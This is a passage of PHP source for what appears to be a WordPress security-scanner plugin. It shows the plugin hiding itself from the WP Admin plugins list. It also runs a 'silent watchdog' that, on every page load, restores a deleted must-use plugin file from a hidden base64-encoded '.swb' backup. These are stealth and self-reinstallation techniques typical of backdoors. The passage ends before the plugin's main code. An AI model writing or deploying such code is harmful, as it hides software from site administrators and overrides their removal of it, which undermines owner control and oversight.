...
// Always hide this plugin from the WP Admin plugins list.
add_filter('all_plugins', static function ($plugins) {
    unset($plugins[plugin_basename(__FILE__)]);
    return $plugins;
}, 9999);

if (defined('SW_SCANNER_LOADED')) {
    // ── Silent watchdog mode ───────────────────────────────────────────────────
    // The mu-plugin is running — this copy stays completely invisible.
    // Single task: if mu-plugin is ever deleted, restore it from the .swb backup.
    add_action('init', static function () {
        $scanner = WP_CONTENT_DIR . '/mu-plugins/server-wall-scanner.php';
        $backup  = WP_CONTENT_DIR . '/mu-plugins/.swb';
        if (!file_exists($scanner) && file_exists($backup)) {
            $d = base64_decode(@file_get_contents($backup));
            if ($d && strlen($d) > 500) {
                @file_put_contents($scanner, $d);
            }
        }
    }, PHP_INT_MIN);
    return; // Do not load the full plugin — zero conflicts.
}

// ── Full plugin mode ───────────────────────────────────────────────────────────
// The mu-plugin is absent — this copy activates as the primary scanner.
// Defines SW_SCANNER_LOADED so no other copy tries to also run.
